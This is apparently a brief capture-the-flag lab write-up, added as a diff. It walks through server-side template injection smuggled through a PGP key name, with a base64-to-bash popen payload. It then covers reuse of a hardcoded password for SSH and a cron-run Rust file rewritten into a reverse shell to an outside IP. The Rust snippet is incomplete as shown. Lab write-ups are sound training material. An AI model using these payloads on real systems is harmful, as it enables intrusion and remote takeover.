@@ -1,0 +1,38 @@
+on the main site there was a function that validates the ==pgp sigin== and the public key ..
+
+we need to create ==pgp key== and validate it and we can get shell via ==ssti==
+
+```
+gpg --gen-key
+gpg -a -o pub.key --export hacker
+cat pub.key
+echo 'life time' | gpg --clear-sign
+we paste both the keys and it showed some error double quoting the name we used to make the key
+
+so we did
+{{ namespace.__init__.__globals__.os.popen('echo /... | base64 -d | bash ').read() }}
+and got shell
+```
+
+in .config in home dir the password for other user was hardcoded we used it to ssh
+
+and got user,txt
+
+now ==pspy== told in /opt/tipnet a ==rs file== was on cron so we edited it using chat gpt
+
+```
+use std::process::Command;
+
+fn main() {
+    // Execute the 'bash' command
+    let output = Command::new("bash")
+        .arg("-c")
+        .arg("bash -i >& /dev/tcp/10.10.14.10/5555 0>&1")
+        .expect("Failed to execute bash command");
+```
+
+and got shell as ash now for the ==jail break ==
+
+we used `https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25`
+
+and got shell as root
